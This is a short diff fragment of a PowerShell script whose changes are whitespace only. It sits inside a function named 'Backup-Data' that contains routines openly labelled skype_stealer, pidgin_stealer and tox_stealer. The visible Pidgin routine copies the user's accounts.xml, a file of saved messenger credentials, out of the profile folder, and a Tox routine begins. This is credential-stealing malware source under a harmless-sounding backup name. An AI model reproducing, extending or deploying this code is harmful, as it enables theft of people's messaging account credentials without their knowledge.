@@ -442,8 +442,8 @@ function Backup-Data {
     }
     skype_stealer
     
-	
-	# Pidgin 
+    
+    # Pidgin 
     function pidgin_stealer {
         $pidgin_folder = "$env:userprofile\AppData\Roaming\.purple"
         if (!(Test-Path $pidgin_folder)) { return }
@@ -452,8 +452,8 @@ function Backup-Data {
         Copy-Item -Path "$pidgin_folder\accounts.xml" -Destination $pidgin_accounts -Recurse -force 
     }
     pidgin_stealer
-	
-	# Tox 
+    
+    # Tox 
     function tox_stealer {
             $tox_folder = "$env:appdata\Tox"
             if (!(Test-Path $tox_folder)) { return }
